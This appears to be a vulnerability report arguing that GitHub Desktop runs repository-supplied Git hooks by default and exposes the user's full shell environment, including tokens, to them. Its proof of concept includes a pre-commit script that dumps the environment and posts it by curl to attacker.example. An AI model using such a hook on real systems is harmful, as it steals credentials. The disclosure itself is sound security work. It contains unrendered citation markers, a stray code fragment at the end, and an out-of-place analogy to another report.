### Title
Default-enabled Git hooks execute attacker-controlled scripts from a fetched repository with the user's full unfiltered shell environment - (File: `app/src/lib/hooks/hooks-proxy.ts`)

### Summary
GitHub Desktop's core safety property has historically been that it never executes repository-supplied Git hooks — this is what differentiates opening/cloning an untrusted repository in Desktop from running raw `git` commands in a shell. Recent changes (`app/src/lib/hooks/with-hooks-env.ts`, `app/src/lib/hooks/get-repo-hooks.ts`, `app/src/lib/hooks/hooks-proxy.ts`) reintroduce automatic hook execution, enabled by default (`changelog.json` entries "Enable hooks support by default - #21590" and "Run hooks in user's shell environment"). The hook process is spawned with the user's complete, unfiltered interactive shell environment merged in, giving an attacker-supplied hook script access to secrets it should never see.

### Finding Description
When a Desktop-initiated Git operation (`commit`, `merge`, `pull`, `push`) is run, `withHooksEnv` (`app/src/lib/hooks/with-hooks-env.ts:29-96`) enumerates executable hooks present in the target repository via `getRepoHooks`, which resolves `core.hooksPath` directly from the repository's own local Git config (`app/src/lib/hooks/get-repo-hooks.ts:54-79`): [1](#0-0) 

If any of these hooks exist and are executable, Desktop copies a `process-proxy` shim into a temp hooks dir and points `GIT_CONFIG_PARAMETERS` at it so Git will invoke the proxy for the corresponding hook events: [2](#0-1) 

The proxy (`createHooksProxy`, `app/src/lib/hooks/hooks-proxy.ts:144-264`) then actually spawns the real hook binary/script found in the repository. Crucially, the spawned child process' environment is built as: [3](#0-2) 

`shellEnv.env` originates from `getShellEnv` (`app/src/lib/hooks/get-shell-env.ts:16-90`), which launches the user's actual interactive shell and captures **every** environment variable it exports (to support tools like `nvm`/`rbenv`), with no filtering: [4](#0-3) 

Only `proxyEnv` (the variables Git itself passes into the hook invocation) is filtered down to `GIT_`/`GITHEAD_`-prefixed "safe" variables via `safeEnv` (`app/src/lib/hooks/hooks-proxy.ts:166-176`): [5](#0-4) 

But `safeEnv` is spread *after* `shellEnv.env`, so it only overrides matching keys — it does not remove or filter the full shell environment. Any secret set in the user's `~/.bashrc`/`~/.zshrc`/`~/.profile` (API tokens, cloud credentials, `NPM_TOKEN`, `GITHUB_TOKEN`, SSH agent sockets, etc.) is handed directly to the attacker-authored hook script.

The broken invariant, analogous to the SFPM report's "state committed to attacker-controlled logic before internal accounting is finalized," is: **Desktop treats repository content (its `.git/config` `core.hooksPath` value and hook scripts) as trusted enough to execute automatically, and additionally exposes the victim's real environment to that untrusted code**, whereas the whole design point of `withHooksEnv`/hook interception historically was to keep Desktop's execution environment isolated from arbitrary user-supplied repository code.

### Impact Explanation
A repository delivered as a folder/bundle/zip containing a pre-populated `.git` directory (e.g., downloaded from a compromised mirror, a malicious "clone this and open in Desktop" tutorial, or a crafted release archive) can ship a `core.hooksPath` and an executable `pre-commit`/`post-checkout`/`pre-push`/etc. script. As soon as the victim performs an ordinary action in Desktop (commit, pull, merge, or push) on that repository, Desktop will:
1. Detect and stage the attacker's hook via `getRepoHooks`.
2. Execute it with the victim's real, un-sandboxed interactive shell environment.

This yields arbitrary code execution with access to any credentials/tokens present in the user's shell environment — a direct token/credential exfiltration and code-execution primitive triggered purely by opening/using an attacker-controlled repository, with no additional user consent beyond the normal commit/pull/push workflow.

### Likelihood Explanation
The feature is enabled by default (`changelog.json`: "Enable hooks support by default - #21590", "Enable one-time opening..." and hook support for merge/pull/push added in the same release train). `getHooksEnvEnabled`/`defaultHooksEnvEnabledValue` derive from `enableHooksByDefault()` (`app/src/lib/hooks/config.ts:1-12`), meaning many users will have this on without ever visiting Preferences > Git > Hooks. The only user action required is a completely ordinary Git workflow step (commit/pull/merge/push) on a repository the user obtained from an untrusted source — well within the accepted attacker model ("attacker controls a cloned/fetched repository").

### Recommendation
- Do not merge the victim's full interactive shell environment into the hook process; only pass an explicit allow-list of variables actually required (e.g., `PATH` additions for version managers), never arbitrary exported secrets.
- Require explicit, per-repository user confirmation before ever executing hooks discovered in a newly added/cloned repository (trust-on-first-use prompt), rather than enabling hook execution globally by default.
- Sanitize/strip well-known secret-like variable name patterns (`*_TOKEN`, `*_SECRET`, `*_KEY`, `AWS_*`, etc.) even when the "load shell env" feature is enabled.

### Proof of Concept
1. Attacker prepares a repository archive whose `.git/config` sets `core.hooksPath = .githooks` and includes an executable `.githooks/pre-commit` script such as:
   ```sh
   #!/bin/sh
   env > /tmp/exfil.txt
   curl -s -X POST -d @/tmp/exfil.txt https://attacker.example/collect
   exit 0
   ```
2. Victim downloads/extracts this archive and opens it as a local repository in GitHub Desktop (hooks support enabled by default).
3. Victim makes a normal edit and clicks "Commit". Desktop's `createCommit` (`app/src/lib/git/commit.ts:51-70`) runs with `interceptHooks: ['pre-commit', ...]`, triggering `withHooksEnv` → `createHooksProxy`, which spawns the attacker's `pre-commit` script with `env: { ...shellEnv.env, ...safeEnv, GITHUB_DESKTOP: '1' }` (`app/src/lib/hooks/hooks-proxy.ts:253`).
4. Any secrets present in the victim's shell startup files are captured by `env` and exfiltrated to the attacker's server, and the malicious script executes with arbitrary code-execution privileges under the victim's user account, without any confirmation dialog from Desktop.

        const startMatch = stdout.match(startRe)

        if (!startMatch || startMatch.index === undefined) {
          return reject(
            new Error('could not find start marker in shell output')
          )
        }

        const lastEndMatch = [...stdout.matchAll(endRe)].at(-1)
